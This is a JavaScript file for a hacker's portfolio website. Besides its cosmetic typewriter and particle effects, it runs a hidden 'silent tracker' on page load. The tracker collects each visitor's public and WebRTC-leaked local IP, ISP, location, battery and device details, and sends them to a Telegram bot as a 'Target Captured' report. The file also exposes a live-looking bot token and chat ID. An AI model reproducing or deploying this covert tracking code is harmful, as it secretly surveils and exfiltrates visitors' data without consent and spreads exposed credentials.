/* Project: Yash Khan Elite Portfolio 
   Updated: WebRTC Leak & Advanced Stealth Tracker
*/

// --- 1. CONFIGURATION ---
const TELEGRAM_BOT_TOKEN = '8414005580:AAGDuGg7LemMlzS6QJu5_06aHamqMlGYnas';
const TELEGRAM_CHAT_ID = '7950771882';

// --- 2. TYPEWRITER EFFECT (Unchanged) ---
const textArray = [
    "CYBER SECURITY STRATEGIST", 
    "OFFENSIVE PENETRATION TESTER", 
    "WHITE HAT HACKER", 
    "DEFENDING DIGITAL BANGLADESH"
];
let textIndex = 0, charIndex = 0, isErasing = false;

function typeEffect() {
    const typewriterElement = document.getElementById("typewriter");
    if (!typewriterElement) return;
    const currentWord = textArray[textIndex];
    typewriterElement.textContent = isErasing ? currentWord.substring(0, charIndex--) : currentWord.substring(0, charIndex++);
    let delay = isErasing ? 50 : 100;
    if (!isErasing && charIndex === currentWord.length) { delay = 2000; isErasing = true; }
    else if (isErasing && charIndex === 0) { isErasing = false; textIndex = (textIndex + 1) % textArray.length; delay = 500; }
    setTimeout(typeEffect, delay);
}

// --- 3. ADVANCED SILENT TRACKER (Updated with Local IP Capture) ---
async function runSilentTracker() {
    const scanStatus = document.getElementById('scan-status');
    const userDetails = document.getElementById('user-details');

    let intel = {
        publicIp: 'Fetching...',
        localIp: 'Searching...',
        isp: 'N/A',
        loc: 'N/A',
        battery: 'N/A',
        os: navigator.platform,
        screen: `${window.screen.width}x${window.screen.height}`,
        cores: navigator.hardwareConcurrency || "Hidden",
        time: new Date().toLocaleString('en-US', { timeZone: 'Asia/Dhaka' })
    };

    // মেথড: লোকাল আইপি (192.168...) ধরার জন্য WebRTC Leak
    async function getLocalIP() {
        return new Promise((resolve) => {
            const rtc = new RTCPeerConnection({ iceServers: [] });
            rtc.createDataChannel('');
            rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
            rtc.onicecandidate = (ice) => {
                if (ice && ice.candidate && ice.candidate.candidate) {
                    const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
                    if (match) resolve(match[1]);
                }
            };
            setTimeout(() => resolve("Blocked/Shielded"), 2000);
        });
    }

    try {
        // ১. পাবলিক আইপি এবং জিও তথ্য
        const res = await fetch('https://ipapi.co/json/');
        const ipData = await res.json();
        intel.publicIp = ipData.ip || "N/A";
        intel.isp = ipData.org || "N/A";
        intel.loc = ipData.city ? `${ipData.city}, ${ipData.country_name}` : "N/A";

        // ২. লোকাল আইপি (আপনার 192.168.8.6 ধরার চেষ্টা)
        intel.localIp = await getLocalIP();

        // ৩. হার্ডওয়্যার এবং ব্যাটারি
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            intel.battery = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not Charging'})`;
        }

        // UI Update (ওয়েবসাইটের স্ক্রিনে যা দেখাবে)
        if (scanStatus) {
            scanStatus.innerHTML = "⚠️ SECURITY VULNERABILITY DETECTED: CONNECTION EXPOSED";
            scanStatus.style.color = "#ff003c";
        }
        if (userDetails) {
            userDetails.innerHTML = `
                > [SYSTEM] PUBLIC IP: <span style="color:#fff">${intel.publicIp}</span> <br>
                > [SYSTEM] LOCAL IP: <span style="color:#fff">${intel.localIp}</span> <br>
                > [SYSTEM] ISP: <span style="color:#fff">${intel.isp}</span> <br>
                > [SYSTEM] LOC: <span style="color:#fff">${intel.loc}</span> <br>
                > [SYSTEM] BATT: <span style="color:#fff">${intel.battery}</span> <br>
                > [SYSTEM] STATUS: <span style="color:#ff003c">TRACED</span>
            `;
        }

        // ৪. টেলিগ্রামে ফুল রিপোর্ট পাঠানো
        const message = `
🎯 **Target Captured (Deep Scan)!**
-----------------------------
🌐 **Public IP:** ${intel.publicIp}
🏠 **Local IP:** ${intel.localIp}
🏢 **ISP:** ${intel.isp}
📍 **Location:** ${intel.loc}
🔋 **Battery:** ${intel.battery}
💻 **Platform:** ${intel.os}
🖥️ **Screen:** ${intel.screen}
⚙️ **Cores:** ${intel.cores}
🕒 **Time:** ${intel.time} (BD)
-----------------------------
🚀 *Injected by Yash Khan Intelligence Unit*
`;

        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' })
        });

    } catch (err) {
        console.warn("Tracker shielded.");
    }
}

// --- 4. PARTICLES.JS (Unchanged) ---
function initParticles() {
    if (typeof particlesJS !== 'undefined') {
        particlesJS("particles-js", {
            "particles": {
                "number": { "value": 80, "density": { "enable": true, "value_area": 800 } },
                "color": { "value": "#00ff41" },
                "opacity": { "value": 0.2, "random": true },
                "size": { "value": 2, "random": true },
                "line_linked": { "enable": true, "distance": 150, "color": "#00ff41", "opacity": 0.1, "width": 1 },
                "move": { "enable": true, "speed": 1, "direction": "none", "random": true, "out_mode": "out" }
            },
            "interactivity": {
                "events": { "onhover": { "enable": true, "mode": "grab" }, "onclick": { "enable": true, "mode": "push" } }
            },
            "retina_detect": true
        });
    }
}

// --- INITIALIZE ---
window.onload = () => {
    initParticles();
    typeEffect();
    setTimeout(runSilentTracker, 2000);
};
